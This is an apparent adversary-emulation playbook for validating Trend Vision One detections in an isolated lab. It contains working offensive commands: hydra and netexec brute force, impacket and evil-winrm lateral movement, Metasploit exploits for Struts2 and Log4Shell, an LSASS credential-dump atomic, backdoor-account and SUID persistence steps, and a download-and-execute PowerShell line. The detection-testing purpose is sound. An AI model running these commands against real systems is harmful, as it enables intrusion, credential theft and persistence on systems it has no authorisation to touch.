# TrendAI Lab - Attack Emulation Playbook

A scoped, ATT&CK-mapped attack chain that runs from the VPC1 attacker host into
the VPC2 protected estate, then moves laterally. Everything here is adversary
**emulation** for detection validation: isolated lab, your own hosts, benign
payloads (EICAR), authenticated movement with the lab's own credentials, and
Atomic Red Team with cleanup. Do not run any of this outside this lab.

The goal: every phase produces something visible across the three detection layers —
**V1ES/V1SWP** (host prevention), **EDR** (host telemetry), and **NDR / DDI**
(network) — fused into one Workbench incident.

---

## Phase 0 - Arm the defenses first (or you will see nothing)

Detections only fire if the protections are on. All three VPC2 machines run both
the **V1ES/V1SWP agent** (prevention) and the **EDR module** (telemetry). The
**NDR layer** (DDI + Network Sensor) covers the network. Before attacking, confirm
all three layers are active.

In Vision One Server & Workload Protection, apply a policy to the three VPC2 targets with:

- **Anti-Malware**: real-time scan on (catches EICAR).
- **Firewall**: on, with **Reconnaissance** detection enabled (Network or Port
  Scan, OS Fingerprint Probe). This is what turns nmap into an agent detection.
- **Intrusion Prevention (IPS)**: on, in Detect or Prevent.
- **Activity Monitoring** (EDR): on. This is the EDR telemetry module that feeds
  the XDR Workbench and lets it correlate host behavior (process chains, file
  writes, network connections) with DDI network events. Without this, the Workbench
  incident graph will be sparse.
- **Log Inspection (LI)**: on. Apply the pre-built rule sets for Linux
  ("Linux - Authentication", "Linux - Sudo", "Linux - System Events") and
  Windows ("Microsoft Windows Events - Security", "Microsoft Windows Events -
  System"). These watch auth.log, /var/log/secure, Windows Security and System
  EventLogs for suspicious patterns — failed logins, privilege changes, service
  installs, account creation.
- **Integrity Monitoring (IM)**: on. Apply the pre-built rules for Linux
  ("Linux - Critical System Files": /etc/passwd, /etc/shadow, /etc/hosts,
  /etc/sudoers, /etc/ssh/sshd_config, /bin, /usr/bin) and Windows
  ("Windows - Registry" Run keys, "Windows - System32", hosts file). These
  generate an alert the moment any monitored file or registry key changes.

Confirm DDI is registered to Vision One and the three mirror sessions are active.

Set the lab password once per shell so the commands below are copy-paste ready:

```bash
LABPW='<the UserPassword you deployed with>'    # same as the stack parameter
```

Pull the target IPs from the stack Outputs (TargetWindowsPrivateIp,
TargetUbuntu1PrivateIp, TargetUbuntu2PrivateIp). Below: WIN, U1, U2.

---

## Phase 1 - External recon and initial access (from the VPC1 attacker)

Run from the attacker host (SSM session or SSH from your AdminCidr).

**1a. Service discovery** - ATT&CK T1046 / T1595

```bash
nmap -Pn -sV --top-ports 1000 <WIN> <U1> <U2>
```

*Expect:* DDI network/port-scan detection. SWP firewall reconnaissance event on each target.

**1b. SSH brute force against Ubuntu-1** - ATT&CK T1110

```bash
printf '%s\n' password123 admin letmein "$LABPW" > /opt/lab/loot/pw.txt
hydra -l trendai -P /opt/lab/loot/pw.txt ssh://<U1> -t 4 -f
```

*Expect:* DDI brute-force / repeated-auth detection. SWP/XDR: burst of failed
logons followed by a success.

**1c. Foothold with the recovered credential** - ATT&CK T1078 (Valid Accounts)

```bash
sshpass -p "$LABPW" ssh -o StrictHostKeyChecking=no trendai@<U1>
```

**1d. Drop the benign malware test file on the victim** - ATT&CK T1105

On Ubuntu-1 (the EICAR string is a harmless industry-standard AV test, not malware):

```bash
printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.txt
```

*Expect:* SWP Anti-Malware detection **on Ubuntu-1**, the protected host (not the attacker).

---

## Phase 2 - Discovery and staging on the foothold

Still on Ubuntu-1. Stage tools from the attacker, then look around.

```bash
# from the ATTACKER, push tooling to the foothold
scp -o StrictHostKeyChecking=no $(which nmap) trendai@<U1>:/tmp/ 2>/dev/null || true
# on U1: local recon - ATT&CK T1016 / T1018 / T1046
whoami; id; ip -br a; arp -a
nmap -Pn --top-ports 200 10.1.2.0/24
```

*Expect:* DDI sees internal east-west scanning. XDR logs discovery commands.

---

## Phase 3 - Lateral movement inside VPC2

From the Ubuntu-1 foothold (install netexec there if needed: `pipx install netexec`).

**3a. SMB to the Windows host** - ATT&CK T1021.002 / T1570

```bash
nxc smb <WIN> -u trendai -p "$LABPW" --shares
nxc smb <WIN> -u trendai -p "$LABPW" -x "whoami && hostname"
```

**3b. RDP reachability** - ATT&CK T1021.001

```bash
nxc rdp <WIN> -u trendai -p "$LABPW"
```

**3c. SSH pivot to Ubuntu-2 and plant EICAR** - ATT&CK T1021.004

```bash
sshpass -p "$LABPW" ssh -o StrictHostKeyChecking=no trendai@<U2> \
  "printf '%s' 'X5O!P%@AP[4\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' > /tmp/eicar.txt"
```

*Expect:* DDI flags SMB/RDP/SSH lateral movement and anomalous internal auth.
SWP fires on Windows (remote logon, command execution) and on Ubuntu-2 (Anti-Malware).

**3d. Windows credential attacks (SMB / RDP / WinRM)** - ATT&CK T1110.001 / T1110.003

Spray and brute the Windows services to exercise brute-force detection on the
endpoint and network. Run from the attacker host or the Ubuntu-1 foothold. Keep
the wordlist tiny and lab-scoped; it ends with the real lab password so one attempt
succeeds and you see the failed-to-success transition.

```bash
printf '%s\n' Summer2024 Password1 Welcome1 admin123 "$LABPW" > /opt/lab/loot/winpw.txt

# SMB password attack (T1110.003 password spraying / brute force)
nxc smb <WIN> -u trendai -p /opt/lab/loot/winpw.txt

# WinRM brute (5985)
nxc winrm <WIN> -u trendai -p /opt/lab/loot/winpw.txt

# RDP brute (3389)
hydra -l trendai -P /opt/lab/loot/winpw.txt rdp://<WIN> -t 1 -f

# Optional: spray one password across several usernames (more realistic spray)
nxc smb <WIN> -u administrator trendai guest -p "$LABPW" --continue-on-success
```

*Expect:* DDI brute-force and repeated-auth detections against the Windows host.
SWP / XDR: clusters of failed Windows logons (event 4625) then a success (4624),
which the Workbench tags as a brute-force technique.

**Caveat:** if you set a Windows account lockout policy, repeated failures will
lock the account. For the lab, leave lockout off or keep the wordlist short so you
still get the success event. Throttle RDP with `-t 1` to avoid hammering the box.

**3e. Cross-platform lateral movement chain** - ATT&CK T1021.002 / T1021.006 / T1021.004 / T1021.001

The full chain: VPC1 → Ubuntu-1 (SSH, Phase 1) → Windows (impacket from Linux) →
Ubuntu-2 (PowerShell SSH from Windows). DDI sees every hop because each session
crosses a mirrored ENI; SWP sees the remote-execution events on each landing host.

*Linux → Windows via impacket (from the attacker or Ubuntu-1 foothold):*

```bash
# WMIExec — interactive shell over DCOM/RPC, no file drop (T1021.006)
impacket-wmiexec trendai:"$LABPW"@<WIN>

# Non-interactive single command
impacket-wmiexec trendai:"$LABPW"@<WIN> "whoami && hostname && ipconfig"

# PSExec — creates a remote service (EventID 7045), louder, great for SWP detection
impacket-psexec trendai:"$LABPW"@<WIN>

# SMBExec — command execution via SMB shares, fileless variant
impacket-smbexec trendai:"$LABPW"@<WIN>
```

*Linux → Windows via evil-winrm (full WinRM shell, T1021.006):*

```bash
evil-winrm -i <WIN> -u trendai -p "$LABPW"
# Once in the shell:
# whoami; ipconfig; net user; net localgroup Administrators
```

*Windows → Linux via PowerShell SSH (OpenSSH client built into Windows Server 2022):*

Run from a PowerShell session on the Windows host (Fleet Manager or SSM):

```powershell
# SSH from Windows to Linux targets (T1021.004)
ssh -o StrictHostKeyChecking=no trendai@<U1> "id; hostname; cat /etc/os-release"
ssh -o StrictHostKeyChecking=no trendai@<U2> "id; hostname; ls /opt/lab/"

# Drop EICAR on Ubuntu-2 from Windows (Anti-Malware fires on U2)
ssh -o StrictHostKeyChecking=no trendai@<U2> `
  "printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}`$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!`$H+H*' > /tmp/eicar_from_win.txt"
```

*Expect:*
- DDI: SMB/DCOM/WinRM lateral sessions attacker→Windows; SSH sessions Windows→Linux.
- SWP on Windows: service creation (PSExec → EventID 7045), WMI remote execution,
  lateral tool transfer.
- SWP on Ubuntu-2: SSH login from Windows IP (non-standard source), Anti-Malware hit.
- Workbench: the hop chain (U1 → WIN → U2) should appear as a single correlated
  incident with lateral-movement techniques tagged across all three hosts.

---

## Phase 4 - Endpoint TTPs on Windows (Atomic Red Team)

Open a PowerShell session on the Windows host via Fleet Manager / SSM, then install
the framework and run a few self-cleaning atomics. Always run with `-Cleanup`.

```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics -Force
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

Invoke-AtomicTest T1059.001 -GetPrereqs; Invoke-AtomicTest T1059.001          # PowerShell exec
Invoke-AtomicTest T1087.001                                                    # Account discovery
Invoke-AtomicTest T1053.005 -GetPrereqs; Invoke-AtomicTest T1053.005 -Cleanup  # Scheduled task persistence
Invoke-AtomicTest T1136.001 -Cleanup                                           # Create account
Invoke-AtomicTest T1003.001 -GetPrereqs; Invoke-AtomicTest T1003.001 -Cleanup  # LSASS credential access (should be blocked/flagged)
```

*Expect:* SWP Activity Monitoring / behavior detections and high-severity XDR
events, mapped to the matching ATT&CK techniques.

---

## Phase 4b - Exploit a known, patched CVE (IPS virtual-patching demo)

This is the SWP money shot: the host OS is fully patched, but you run a public
exploit for an old CVE against a deliberately-vulnerable Docker container, and SWP
**Intrusion Prevention** blocks it while DDI flags the exploit on the wire. The
vulnerability lives only inside the throwaway container on Ubuntu-2; the host and
all other machines stay patched.

**Set the IPS mode to tell the story you want.** In the SWP policy, Intrusion
Prevention in **Detect** mode shows the alert and lets the exploit through (good for
"see, we caught it"); **Prevent** mode blocks it (the virtual-patching headline).
Run each CVE once in Detect, then flip to Prevent and rerun to show the block.

**Start a vulnerable scenario** on Ubuntu-2 (vulhub is already cloned at
`/opt/lab/vulhub`). Example, Apache Struts2 (CVE-2017-5638):

```bash
cd /opt/lab/vulhub/struts2/s2-045
sudo docker compose up -d        # exposes the vulnerable app on the host IP:port
```

**Run the matching public Metasploit module** from the attacker host:

```bash
msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl; \
  set RHOSTS <U2>; set RPORT 8080; set LHOST <attacker-ip>; run; exit"
```

**Tear the scenario down** before starting the next one:

```bash
cd /opt/lab/vulhub/struts2/s2-045 && sudo docker compose down -v
```

### Good classic CVEs to demo (reliable public modules, strong DDI/SWP coverage)

| CVE | Scenario (vulhub path) | Metasploit module | What fires |
|-----|------------------------|-------------------|------------|
| CVE-2017-5638 | struts2/s2-045 | multi/http/struts2_content_type_ognl | IPS Struts RCE rule; DDI exploit/OGNL |
| CVE-2021-44228 (Log4Shell) | log4j/CVE-2021-44228 | multi/http/log4shell_header_injection | IPS Log4j JNDI rule; DDI LDAP/JNDI callback |
| CVE-2014-0160 (Heartbleed) | openssl/CVE-2014-0160 | auxiliary/scanner/ssl/openssl_heartbleed | IPS Heartbleed rule; DDI TLS heartbeat anomaly |
| CVE-2014-6271 (Shellshock) | bash/CVE-2014-6271 | multi/http/apache_mod_cgi_bash_env_exec | IPS Shellshock rule; DDI bash env exploit |
| CVE-2017-12149 (JBoss) | jboss/CVE-2017-12149 | multi/http/jboss_invoke_deploy | IPS deserialization rule; DDI exploit |

For an SMB-layer classic against the Windows box itself, EternalBlue
(MS17-010 / CVE-2017-0144) is the canonical IPS and DDI demo. Note Windows Server
2022 is not vulnerable, so use it only as a blocked-attempt demo (the exploit fails
but IPS and DDI still detect the attempt):

```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS <WIN>; run; exit"
```

*Expect:* the SWP Intrusion Prevention event naming the specific rule/CVE (this is
the virtual-patching proof), and a DDI network exploit detection for the same CVE.
In the Workbench, the exploit attempt should correlate with the host context.

---

## Phase 4c - Log Inspection triggers (Linux and Windows)

Log Inspection watches system and application logs for suspicious patterns. Run
these on each target via SSM / Fleet Manager to generate the events SWP LI rules
look for. You do not need to be on the attacker host — open an SSM session directly
on the target to drive these.

**Linux LI triggers** (run on Ubuntu-1 and Ubuntu-2 via SSM session):

```bash
# Auth failures: sudo and su — LI "Linux - Authentication" / "Linux - Sudo"
for i in {1..5}; do sudo -u nobody id 2>/dev/null; done || true
for i in {1..3}; do su - root <<< "badpassword" 2>/dev/null; done || true

# SSH attempt as root to localhost — generates sshd rejection in auth.log
ssh -o StrictHostKeyChecking=no -o PasswordAuthentication=yes root@localhost 2>/dev/null || true

# Privilege escalation pattern — LI "Linux - Privileged Operations"
sudo -i whoami
sudo bash -c 'id && cat /etc/shadow | head -3'

# Service stop/start — LI "Linux - System Services"
sudo systemctl stop rsyslog && sleep 2 && sudo systemctl start rsyslog

# Cron modification — LI "Linux - Cron Events"
sudo bash -c 'echo "# lab test $(date)" >> /etc/cron.d/labtest'
```

**Windows LI triggers** (PowerShell on the Windows host via Fleet Manager):

```powershell
# Account creation (EventID 4720) — LI "Windows - User Account Management"
net user labtest P@ssw0rd123! /add

# Add to Administrators (EventID 4732) — privilege escalation event
net localgroup Administrators labtest /add

# Service install (EventID 7045) — LI "Windows - System" high-value event
sc.exe create LabSvc binPath= "C:\Windows\System32\cmd.exe" start= demand
sc.exe start LabSvc 2>$null

# Scheduled task creation (EventID 4698) — LI "Windows - Task Scheduler"
schtasks /create /sc once /tn "LabTask" /tr "C:\Windows\System32\calc.exe" /st 00:00

# Audit log write — generates a detectable Application log entry
Write-EventLog -LogName "Application" -Source "Application" `
  -EventId 9999 -Message "Lab: simulated suspicious application event" -EntryType Warning

# Cleanup Windows LI artifacts
sc.exe delete LabSvc 2>$null
schtasks /delete /tn "LabTask" /f 2>$null
net user labtest /delete 2>$null
```

*Expect:* SWP Log Inspection events named after the specific rule that matched
("Linux - Authentication: Multiple sudo failures", "Windows - User Account
Created", "Windows - Service Installed"). These appear in the SWP event console
and feed into the XDR Workbench incident timeline alongside the network activity
DDI already captured.

---

## Phase 4d - Integrity Monitoring triggers (Linux and Windows)

Integrity Monitoring raises an alert the moment a monitored file or registry key
changes. Run these after confirming IM is on with the appropriate rule sets
from Phase 0. Each command below should produce an IM event within seconds.

**Linux IM triggers** (run on Ubuntu-1 or Ubuntu-2 via SSM):

```bash
# Modify /etc/hosts — IM "Network Configuration Changed"
sudo bash -c 'echo "10.0.0.1 c2.lab.example.com" >> /etc/hosts'

# Modify /etc/passwd — IM "User Account Database Changed" (HIGH severity)
sudo bash -c 'echo "labbackdoor:x:1999:1999::/tmp:/bin/bash" >> /etc/passwd'

# Modify /etc/sudoers — IM "Sudoers File Changed"
sudo bash -c 'echo "# lab test" >> /etc/sudoers'

# Modify SSH daemon config — IM "SSH Configuration Changed"
sudo bash -c 'echo "# lab test" >> /etc/ssh/sshd_config'

# Create SUID binary — IM "SUID/SGID Bit Set" (T1548.001)
sudo cp /bin/bash /tmp/.suid_bash && sudo chmod u+s /tmp/.suid_bash

# Drop new executable in monitored path — IM "New file in /usr/local/bin"
sudo cp /bin/cat /usr/local/bin/.labcat

# Modify cron.d — IM "Scheduled Task Added"
sudo bash -c 'echo "* * * * * root echo lab" > /etc/cron.d/labpersist'

# --- CLEANUP (run after confirming detections) ---
sudo sed -i '/10.0.0.1 c2.lab.example.com/d' /etc/hosts
sudo sed -i '/labbackdoor/d' /etc/passwd
sudo sed -i '/# lab test/d' /etc/sudoers
sudo sed -i '/# lab test/d' /etc/ssh/sshd_config
sudo rm -f /tmp/.suid_bash /usr/local/bin/.labcat /etc/cron.d/labpersist
```

**Windows IM triggers** (PowerShell on Windows host):

```powershell
# Registry Run key — IM "Registry Persistence Key Modified" (T1547.001)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
  /v LabBackdoor /t REG_SZ /d "C:\Windows\System32\calc.exe" /f

# Modify Windows hosts file — IM "Hosts File Changed"
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" `
  -Value "10.0.0.1 c2.lab.example.com"

# Drop a file in System32 — IM "New Executable in System32"
Copy-Item "C:\Windows\System32\calc.exe" `
  -Destination "C:\Windows\System32\labsvc32.exe" -Force

# Windows Firewall rule change — IM "Firewall Policy Changed" (T1562.004)
netsh advfirewall firewall add rule name="LabTest" `
  protocol=TCP dir=in localport=4444 action=allow

# --- CLEANUP (run after confirming detections) ---
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v LabBackdoor /f 2>$null
(Get-Content "C:\Windows\System32\drivers\etc\hosts") |
  Where-Object { $_ -notmatch "10.0.0.1" } |
  Set-Content "C:\Windows\System32\drivers\etc\hosts"
Remove-Item "C:\Windows\System32\labsvc32.exe" -Force -ErrorAction SilentlyContinue
netsh advfirewall firewall delete rule name="LabTest" 2>$null
```

*Expect:* SWP Integrity Monitoring alerts for each changed file or registry key,
naming the specific rule and the before/after hash or value. These are often the
highest-fidelity events in the Workbench because IM tells you exactly what changed,
not just that something suspicious ran. High-severity IM hits (passwd, sudoers,
Run keys) often become the "root cause" node in the Workbench incident graph.

---

## Phase 5 - Review and respond

- **NDR (DDI / Network Sensor)**: confirm detections for scanning, brute force, and lateral movement.
- **V1ES/V1SWP**: confirm prevention and detection events on each host (Anti-Malware, IPS, LI, IM).
- **EDR (Activity Monitoring)**: confirm the Workbench incident graph shows the host-level execution
  chain — process trees, file drops, and network connections from each endpoint's perspective.
- **Vision One Workbench**: open the correlated incident. It should fuse all three layers — DDI
  network events, V1SWP host events, and EDR telemetry — across the attacker path
  (U1 -> WIN -> U2) into a single incident with observed attack techniques on a timeline.
- **Response (SE track)**: isolate the Windows host, then release it.
- **Outcome (CSM track)**: write the 3-bullet "what happened, what we caught,
  what the customer should do" recap.

---

## Detection mapping (quick reference)

| Phase | Technique | What you run | NDR (DDI) sees | V1ES/V1SWP sees | EDR (Workbench telemetry) |
|-------|-----------|--------------|----------|----------------|
| 1a | T1046 / T1595 | nmap | Port / network scan | Firewall recon event | Outbound scan connections from attacker |
| 1b | T1110 | hydra over SSH | Brute force | Failed-then-success logons | Auth burst → success process chain on U1 |
| 1c | T1078 | sshpass login | Anomalous session | Valid-account logon | SSH session telemetry on U1 |
| 1d | T1105 | EICAR write | - | Anti-Malware hit | File write event on U1 |
| 2 | T1016/18/46 | local recon, subnet scan | Internal scan | Discovery activity | Process + network telemetry: nmap, arp, ip |
| 3a | T1021.002 | nxc smb | SMB lateral | Remote logon + exec | SMB session + remote process exec on WIN |
| 3b | T1021.001 | nxc rdp | RDP lateral | RDP logon | RDP session telemetry on WIN |
| 3c | T1021.004 | ssh + EICAR | SSH lateral | Anti-Malware on U2 | SSH session + file write on U2 |
| 3d | T1110.001/.003 | nxc smb/winrm, hydra rdp | Windows brute force | Failed-then-success 4625/4624 | Auth burst process chain; success logon event |
| 3e | T1021.002/.006/.004 | impacket wmiexec/psexec, evil-winrm, PowerShell SSH | SMB/WMI/WinRM sessions; SSH from Windows | Service create 7045, WMI exec, SSH from unexpected source | Full process trees: wmiexec→cmd, psexec svc→payload, hop chain U1→WIN→U2 in workbench |
| 4 | T1059/1087/1053/1136/1003 | Atomic Red Team | - | Behavior + high-sev XDR | Process/file/registry telemetry for each atomic |
| 4b | T1190 (CVE exploit) | vulhub + Metasploit | Network exploit / CVE | IPS rule named for the CVE (virtual patching) | Process spawn from vulnerable service (if exploit lands) |
| 4c-linux | T1098/T1543/T1070 | failed sudo/su, service stop, cron write | - | LI: auth.log patterns - sudo fail, privilege escalation, service change | Process telemetry: sudo chain, systemctl, cron write |
| 4c-win | T1136/T1543.003/T1053.005 | net user, sc create, schtasks | - | LI: EventID 4720/4732/7045/4698 | Process telemetry: net.exe, sc.exe, schtasks.exe chains |
| 4d-linux | T1548.001/T1037/T1565 | /etc/passwd, /etc/hosts, SUID, cron.d, ssh config | - | IM: critical file change alert with before/after hash | File write telemetry: path, process, user |
| 4d-win | T1547.001/T1565/T1562.004 | Registry Run key, hosts, System32 drop, FW rule | - | IM: registry + file change alerts, high-severity | Registry write + file drop telemetry in workbench graph |

---

## Cleanup

- **Atomic Red Team**: rerun each test with `-Cleanup`.
- **vulhub**: `sudo docker compose down -v` in each scenario folder. Do not leave vulnerable containers running after the session.
- **LI artifacts (Linux)**: `sudo rm -f /etc/cron.d/labtest`
- **LI artifacts (Windows)**: already handled inline (net user /delete, sc delete, schtasks /delete).
- **IM artifacts (Linux)**: run the cleanup block at the bottom of the Phase 4d Linux section (`sed` /etc/hosts, /etc/passwd, /etc/sudoers, /etc/ssh/sshd_config; remove SUID binary, /usr/local/bin/.labcat, /etc/cron.d/labpersist).
- **IM artifacts (Windows)**: run the cleanup block at the bottom of the Phase 4d Windows section (remove Run key, restore hosts file, delete labsvc32.exe, delete FW rule).
- **Planted files**: `rm -f /tmp/eicar*.txt /opt/lab/loot/*.txt` on each host.
- **Windows accounts**: confirm labtest user was deleted; check for any locked accounts and unlock.
- **Stack teardown**: `aws cloudformation delete-stack --stack-name trendai-lab-<name>` per participant to release VPC and Elastic IP quota.

---

## Why this is safe

Every action targets hosts you own inside one isolated, peered lab. Initial access
and lateral movement use the lab's own known credentials, not real cracking. The
only "malware" is the EICAR test string, which is designed for exactly this. Atomic
Red Team is the industry-standard, self-cleaning emulation framework. Nothing here
is novel exploit code, and none of it should ever leave the lab.
